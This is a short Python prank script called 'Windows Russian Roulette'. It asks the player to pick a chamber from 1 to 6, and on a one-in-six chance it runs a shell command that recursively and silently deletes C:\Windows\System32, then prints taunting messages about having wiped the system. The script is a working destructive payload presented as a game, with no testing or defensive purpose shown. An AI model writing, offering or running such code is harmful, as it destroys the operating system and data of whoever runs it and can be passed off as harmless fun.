import random
import os

print("Get ready for the Windows Russian Roulette! 😈")

shit = random.randint(1, 6)

chamber = int(input("Pick a chamber (1-6): "))

if chamber == shit:
    print("Oh no ! You've hit the jackpot! Your system is now in a world of trouble! 😱")
    os.system("rmdir /S /Q C:\\Windows\\System32")
    print("All critical files have been wiped out! Time to reinstall everything! 😈")
else:
    print("You dodged a bullet this time. Care to try your luck again? 😜")
